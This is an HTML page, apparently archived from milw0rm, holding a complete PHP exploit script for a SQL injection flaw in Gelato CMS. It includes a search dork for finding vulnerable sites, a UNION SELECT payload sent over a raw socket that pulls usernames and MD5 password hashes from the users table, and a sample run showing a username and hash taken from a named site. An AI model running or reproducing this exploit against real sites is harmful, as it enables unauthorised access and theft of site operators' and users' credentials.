<html><head><title>Gelato (index.php post) Remote SQL Injection Exploit</title></head><pre>&lt;?
#_ Gelato SQL Injection exploit
#_ Dork: &quot;powered by gelato cms&quot;
#_ Homepage: http://gelatocms.com

#_ [ s 0 c r a t e x ]
#_ msn: s0cratex[at]nasa[dot]gov
#_ greetz: D.O.M and plexinium team

ini_set(&quot;max_execution_time&quot;,0);

function get_text(){
  $in = fopen(&quot;php://stdin&quot;, 'r');
  $text = fgets($in, 1024);
  $text = trim($text);
  return $text; }

echo &quot;Gelato SQL Injection exploit -- by s0cratex\n&quot;;
echo &quot;-------------------------------------------\n\n&quot;;

echo &quot;Host (site.com): &quot;;
$host = get_text();

echo &quot;Path (/gelato): &quot;;
$path = get_text();

echo &quot;Prefix (gl_ / gel_): &quot;;
$prefix = get_text();

if($host &amp;&amp; $path &amp;&amp; prefix){
$cnx = fsockopen($host,80);
if($cnx){
fwrite($cnx,&quot;GET
&quot;.$path.&quot;/index.php?post=-1/**/union/**/select/**/1,concat(0x7330633a3a,login,0x3a3a,password,0x3a3a),null,null,null,null,null/**/from/**/&quot;.$prefix.&quot;users/*
HTTP/1.0\r\nHost: &quot;.$host.&quot;\r\n\r\n&quot;);
while(!feof($cnx)){ $resp .= fgets($cnx); }
fclose($cnx);

$login = strstr($resp,&quot;s0c&quot;);
$login = explode(&quot;::&quot;,$login);
if(is_null($login[1]) || is_null($login[2])){ die(&quot;\nExploit failed... check
the prefix...&quot;); }
echo &quot;\nUsername: &quot;.$login[1];
echo &quot;\nMD5 Hash: &quot;.$login[2];
} else { die(&quot;\nConection problems...&quot;); }
} else { die(&quot;\nPlease check the data...&quot;); }

/*
Gelato SQL Injection exploit -- by s0cratex
-------------------------------------------

Host (site.com): gelatocms.it
Path (/gelato): /
Prefix (gl_ / gel_): gel_

Username: wolly
MD5 Hash: 2eb7401af28ae266360b6028a26cc97a */

?&gt;

# milw0rm.com [2007-09-14]</pre></html>